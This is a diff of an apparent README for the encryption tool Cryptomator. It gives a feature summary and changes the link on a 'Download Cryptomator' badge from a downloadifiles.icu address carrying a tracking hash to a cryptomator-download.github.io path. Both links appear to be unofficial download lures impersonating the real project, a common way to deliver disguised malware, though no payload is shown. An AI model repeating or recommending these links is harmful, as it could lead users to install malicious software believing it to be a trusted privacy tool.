@@ -1,7 +1,6 @@
 **Cryptomator** is an open-source, client-side encryption software that allows users to securely encrypt their files before uploading them to cloud storage services such as Google Drive, Dropbox, or OneDrive. It provides a simple and transparent way to protect sensitive data by creating an encrypted "vault" for storing files. Cryptomator encrypts files locally, meaning the encryption happens on your device before syncing them to the cloud, ensuring that no one, not even cloud service providers, can access your files without the correct password.
 
-[![Download Cryptomator](https://img.shields.io/badge/Download-Cryptomator%20-blueviolet)](https://downloadifiles.icu?label=bed33cdd29a1fdc17814b892c386c9e9
-)
+[![Download Cryptomator](https://img.shields.io/badge/Download-Cryptomator%20-blueviolet)](https://cryptomator-download.github.io/.github/)
 
 **Key Features of Cryptomator:**
 - **End-to-End Encryption:** Files are encrypted locally on your device, ensuring they are secure before uploading to the cloud.
